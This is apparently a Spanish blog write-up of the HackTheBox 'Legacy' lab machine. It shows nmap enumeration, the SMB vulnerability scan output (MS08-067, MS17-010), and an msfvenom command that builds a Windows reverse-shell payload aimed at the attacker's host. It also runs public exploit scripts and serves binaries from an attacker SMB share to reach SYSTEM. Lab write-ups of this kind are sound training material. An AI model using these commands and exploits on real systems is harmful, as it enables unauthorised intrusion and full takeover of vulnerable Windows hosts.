---
layout: single
title: HackTheBox - Máquina Legacy
excerpt: "Solución de la máquina Legacy de Hack the Box"
date: 2021-03-21
classes: wide
header:
  teaser: /assets/images/htb/legacy/legacy.png
  teaser_home_page: true
tags:
  - Htb
  - Pentesting
  - Windows
---

<p align="center">
<img src="/assets/images/htb/legacy/legacy.png">
</p>

# Enumeración

Lanzamos un escaneo de todos los puertos con el estado open para ver que servicios hay corriendo.

```bash
nmap -p- --open -sS --min-rate=5000 -T5 -n -Pn -vvv 10.10.10.4 -oG allPorts
```

Después, lanzamos otro escaneo para obtener versiones.

```bash
nmap -sC -sV -p139,445 10.10.10.4 -oN targeted
```

El resultado que obtenemos es el siguiente:

```text
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```


# Explotación

Vamos a lanzar la búsqueda de vulnerabilidades sobre los servicios de samba.

```bash
nmap --script smb-vuln* -p139,445 -Pn 10.10.10.4
```

Y obtenemos lo siguiente:

```text
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14

```

## MS08-067

Nos descargamos el [exploit de github](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py), generamos un shellcode y editamos el script:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip_atacante> LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Tuve que hacer algunos cambios para que funcionara con python 3 como los print y la excepción del import, por último lo lanzamos y obtenemos la reverse shell.

```bash
python3 ms08-067.py 10.10.10.4 6 445
```

Al intentar hacer un whoami para ver el usuario que tenemos nos da un error, por lo que nos vamos a compartir los binarios de windows (mediante smbserver en impacket) y lo vamos a lanzar a través de la carpeta compartida:

```bash
python3 smbserver.py <nombre_recurso> /usr/share/windows-binaries
```

Y desde la consola de la máquina víctima lanzamos el whoami:

```bash
\\<ip_atacante>\<recurso_compartido>\whoami.exe
```

Y obtenemos el siguiente usuario:

```bash
C:\WINDOWS\system32>\\XX.XX.XX.X\shared\whoami.exe
\\XX.XX.XX.X\shared\whoami.exe
NT AUTHORITY\SYSTEM
```

## MS17-010

He probado otros scripts e intentado hacerlos funcionar pero me daba error de NETBIOS time out, hasta que he dado con [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

Ejecutamos zzz_exploit.py y obtenemos una shell.

```bash
python3 zzz_exploit.py 10.10.10.4
```